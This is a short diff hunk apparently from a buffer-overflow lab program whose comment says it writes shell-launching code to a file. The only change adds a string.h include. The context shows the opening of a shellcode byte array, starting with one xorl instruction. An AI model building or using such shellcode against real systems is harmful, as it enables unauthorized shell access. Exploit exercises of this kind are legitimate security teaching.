@@ -3,6 +3,7 @@
 /*A program that creates a file containing code for launching shell*/
 #include <stdlib.h>
 #include <stdio.h>
+#include <string.h>
 
 const char code[] =
   "\x31\xc0"             /* xorl    %eax,%eax              */
